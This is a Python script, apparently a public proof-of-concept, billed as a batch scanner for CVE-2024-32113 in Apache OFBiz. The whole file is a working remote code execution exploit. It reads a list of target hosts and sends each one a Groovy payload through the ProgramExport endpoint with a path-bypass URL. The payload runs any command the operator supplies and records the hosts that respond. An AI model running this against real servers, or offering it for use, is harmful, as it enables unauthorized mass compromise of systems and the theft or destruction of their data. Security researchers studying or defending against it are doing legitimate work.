import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import warnings
import sys
import re
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.simplefilter('ignore',InsecureRequestWarning)
def banner():
    banner = """
    \n
    ***********************************************
    *              Apache OFBiz                   *
    *       CVE-2024-32113 Batch Scanning         *
    *            PowerBy: YongYe-Security         *
    ***********************************************
    \n
    """
    print(banner)
def Target_File(filename):
    ip_addresses = []
    with open(filename, 'r') as file:
        for line in file:
            url = line.strip()
            if url.startswith('https://'):
                ip_addresses.append(url)
            else:
                ip_addresses.append('http://' + url)
    return ip_addresses
def CheckTarget(ip,cmd):
    url = f'{ip}/webtools/control/forgotPassword;/ProgramExport'
    headers = {
        'User-Agent': 'Mozilla/999.0 (Windows 3200; Win x12400) Chrome/888.0.7.2 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {'groovyProgram': f"throw new Exception('{cmd}'.execute().text);"}
    try:
        response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)
        response_text = response.text
        match = re.search(r'java\.lang\.Exception:(.*)', response_text)
        if match:
            exception_details = match.group(1).strip()
            print(f'[+] {ip}\t\t{exception_details}')
            with open('Out.txt', 'a') as out_file:
                out_file.write(f'{ip}\n')
        else:
            print(f'[-] {ip}')
    except Exception:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description='CVE-2024-32113 Batch Scanning')
    parser.add_argument('-f', '--file', required=True, help='Target File')
    parser.add_argument('-c', '--cmd', default='id', help='command')
    args = parser.parse_args()
    ip_addresses = Target_File(args.file)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(CheckTarget,ip,args.cmd) for ip in ip_addresses]
        for future in as_completed(futures):
            pass

if __name__ == "__main__":
    main()
